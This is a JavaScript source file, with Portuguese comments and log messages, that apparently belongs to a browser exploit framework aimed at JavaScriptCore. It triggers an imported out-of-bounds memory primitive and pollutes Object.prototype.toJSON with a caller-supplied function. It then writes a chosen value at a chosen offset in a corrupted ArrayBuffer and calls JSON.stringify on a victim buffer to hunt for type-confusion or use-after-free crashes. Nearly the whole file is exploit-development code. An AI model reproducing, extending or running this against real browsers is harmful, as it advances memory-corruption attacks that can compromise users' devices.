// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// O contador é gerenciado em runAllAdvancedTestsS3.mjs
// export let current_toJSON_call_count_for_TypeError_test = 0; // Não mais exportado daqui

export async function executeFocusedTestForTypeError(
    testDescription,
    toJSONFunctionToUse, // A variante da função toJSON a ser testada
    valueToWriteOOB,     // O valor a ser escrito via OOB
    corruptionOffsetToTest // O offset específico para esta escrita OOB
) {
    const FNAME = `executeFocusedTestForTypeError<${testDescription}>`;
    logS3(`--- Iniciando Teste Focado para TypeError: ${testDescription} ---`, "test", FNAME);
    logS3(`    Corrupção OOB: Valor=${toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)} (em oob_array_buffer_real)`, "info", FNAME);
    document.title = `Iniciando: ${testDescription}`;

    // O contador de chamadas toJSON é gerenciado e resetado pelo chamador em runAllAdvancedTestsS3.mjs

    const victim_ab_size_val = 64;
    const bytes_to_write_val = 4; // Para 0xFFFFFFFF
    const ppKey_val = 'toJSON';

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup.", "error", FNAME);
        document.title = "ERRO OOB Setup - " + FNAME;
        return { errorOccurred: new Error("OOB Setup Failed"), potentiallyCrashed: false, stringifyResult: null };
    }
    document.title = "OOB OK - " + FNAME;

    let victim_ab = new ArrayBuffer(victim_ab_size_val); // O alvo do stringify
    logS3(`ArrayBuffer vítima (${victim_ab_size_val} bytes) recriado.`, "info", FNAME);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let stepReached = "antes_pp";
    let potentiallyCrashed = true;
    let errorCaptured = null;
    let stringifyResult = null;

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${ppKey_val} com ${toJSONFunctionToUse.name || 'toJSON_function'}...`, "info", FNAME);
        document.title = `Aplicando PP (${toJSONFunctionToUse.name || 'toJSON_function'})`;
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada com ${toJSONFunctionToUse.name || 'toJSON_function'}.`, "good", FNAME);
        stepReached = "pp_aplicada";
        document.title = `PP OK (${toJSONFunctionToUse.name || 'toJSON_function'})`;

        stepReached = "antes_escrita_oob";
        logS3(`CORRUPÇÃO (em oob_array_buffer_real): ${toHex(valueToWriteOOB)} @ ${toHex(corruptionOffsetToTest)}`, "warn", FNAME);
        document.title = `Antes OOB Write (${toHex(corruptionOffsetToTest)})`;
        oob_write_absolute(corruptionOffsetToTest, valueToWriteOOB, bytes_to_write_val);
        logS3("Escrita OOB (em oob_array_buffer_real) feita.", "info", FNAME);
        stepReached = "apos_escrita_oob";
        document.title = `Após OOB Write (${toHex(corruptionOffsetToTest)})`;

        await PAUSE_S3(SHORT_PAUSE_S3);

        stepReached = "antes_stringify";
        document.title = `Antes Stringify (victim_ab) (${toHex(corruptionOffsetToTest)})`;
        logS3(`Chamando JSON.stringify(victim_ab) (usando ${toJSONFunctionToUse.name || 'toJSON_function'})...`, "info", FNAME);
        
        try {
            stringifyResult = JSON.stringify(victim_ab);
            stepReached = `apos_stringify`;
            potentiallyCrashed = false; 
            document.title = `Strfy OK (${testDescription})`;
            logS3(`Resultado JSON.stringify: ${typeof stringifyResult === 'string' ? stringifyResult : JSON.stringify(stringifyResult)}`, "info", FNAME);
        } catch (e) {
            stepReached = `erro_stringify`;
            potentiallyCrashed = false; 
            errorCaptured = e;
            document.title = `ERRO Strfy (${e.name}) - ${testDescription}`;
            logS3(`ERRO CAPTURADO JSON.stringify: ${e.name} - ${e.message}.`, "critical", FNAME);
            if (e.stack) logS3(`   Stack: ${e.stack}`, "error");
            console.error(`JSON.stringify ERROR (${testDescription}):`, e);
        }
    } catch (mainError) {
        potentiallyCrashed = false;
        errorCaptured = mainError;
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME);
        document.title = "ERRO Principal - " + FNAME;
        if (mainError.stack) logS3(`   Stack: ${mainError.stack}`, "error");
        console.error("Main test error:", mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}.`, "info", FNAME);
        if (potentiallyCrashed) {
             document.title = `CONGELOU? ${stepReached} - ${FNAME}`;
             logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}.`, "error", FNAME);
        }
    }
    logS3(`--- Teste Focado para TypeError Concluído: ${testDescription} ---`, "test", FNAME);
    if (!potentiallyCrashed && !errorCaptured) {
        document.title = `Teste Concluído OK - ${testDescription}`;
    } else if (errorCaptured && !document.title.startsWith("ERRO Strfy")) { 
        document.title = `ERRO OCORREU (${errorCaptured.name}) - ${testDescription}`;
    }
    return { errorOccurred: errorCaptured, potentiallyCrashed, stringifyResult };
}
